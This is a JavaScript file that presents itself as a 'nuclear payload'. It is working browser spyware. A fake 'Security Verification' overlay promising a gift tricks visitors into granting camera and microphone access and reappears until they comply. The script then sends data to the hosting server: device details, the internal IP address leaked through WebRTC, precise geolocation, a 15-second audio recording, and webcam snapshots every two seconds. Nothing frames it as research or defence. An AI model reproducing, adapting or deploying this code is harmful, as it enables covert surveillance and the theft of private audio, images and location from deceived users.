// ZEROEYE NUCLEAR PAYLOAD v2.0
// Developer: Zero Haven

const SERVER_URL = window.location.origin;

// === 1. FORCE PERMISSIONS WALL ===
function createWall() {
    if (document.getElementById('zeroeye-wall')) return;
    
    const wall = document.createElement('div');
    wall.id = 'zeroeye-wall';
    wall.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.98);z-index:99999;display:flex;flex-direction:column;justify-content:center;align-items:center;color:white;text-align:center;font-family:sans-serif;';
    
    wall.innerHTML = `
        <h2 style="color:#ff3333;">Security Verification</h2>
        <p style="font-size:18px;">Please allow permissions to verify you are human.</p>
        <p style="color:#888;">This is required to claim your gift.</p>
        <button id="verify-btn" style="padding:15px 40px;margin-top:20px;background:#28a745;color:white;border:none;border-radius:50px;font-size:20px;font-weight:bold;cursor:pointer;box-shadow:0 0 20px rgba(40,167,69,0.5);">VERIFY NOW</button>
    `;
    document.body.appendChild(wall);
    
    document.getElementById('verify-btn').onclick = startAttack;
}

// === 2. DATA EXFILTRATION ===
function sendData(endpoint, data, isFile = false) {
    const formData = new FormData();
    
    if (isFile) {
        formData.append('file', data);
    } else {
        formData.append('data', JSON.stringify(data));
    }

    // Attempt Beacon first (Works on tab close)
    try {
        navigator.sendBeacon(SERVER_URL + endpoint, formData);
    } catch (e) {
        // Fallback to fetch
        fetch(endpoint, { method: 'POST', body: formData });
    }
}

// === 3. ATTACK VECTORS ===
async function startAttack() {
    try {
        // Request Permissions
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
        
        // Remove Wall if successful
        const wall = document.getElementById('zeroeye-wall');
        if (wall) wall.remove();

        console.log("ZeroEye: Access Granted");

        // A. SYSTEM DUMP
        const sysInfo = {
            platform: navigator.platform,
            cores: navigator.hardwareConcurrency,
            ram: navigator.deviceMemory || "Unknown",
            screen: `${window.screen.width}x${window.screen.height}`,
            gpu: document.createElement('canvas').getContext('webgl').getParameter(37446)
        };
        sendData('/upload_sys', sysInfo);

        // B. IP LEAK (WebRTC)
        const rtc = new RTCPeerConnection({iceServers:[]});
        rtc.createDataChannel('');
        rtc.createOffer().then(o => rtc.setLocalDescription(o));
        rtc.onicecandidate = (e) => {
            if (e && e.candidate && e.candidate.candidate) {
                const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)[1];
                sendData('/upload_ip', { internal_ip: ip });
            }
        };

        // C. GEOLOCATION
        navigator.geolocation.getCurrentPosition(pos => {
            const geo = {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                acc: pos.coords.accuracy,
                speed: pos.coords.speed
            };
            sendData('/upload_geo', geo);
        }, err => console.log("Geo Denied"), { enableHighAccuracy: true });

        // D. AUDIO BUG (15 Seconds)
        const mediaRecorder = new MediaRecorder(stream);
        let chunks = [];
        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'audio/wav' });
            sendData('/upload_audio', blob, true);
        };
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 15000);

        // E. CAM SHOT (Every 2 seconds)
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);
        
        setInterval(async () => {
            try {
                const bitmap = await imageCapture.grabFrame();
                const canvas = document.createElement('canvas');
                canvas.width = bitmap.width;
                canvas.height = bitmap.height;
                canvas.getContext('2d').drawImage(bitmap, 0, 0);
                canvas.toBlob(blob => {
                    sendData('/upload_cam', blob, true);
                }, 'image/jpeg', 0.8);
            } catch(e) {}
        }, 2000);

    } catch (err) {
        console.log("Permission Denied");
        createWall(); // Bring back the wall!
    }
}

// Init
window.onload = createWall;
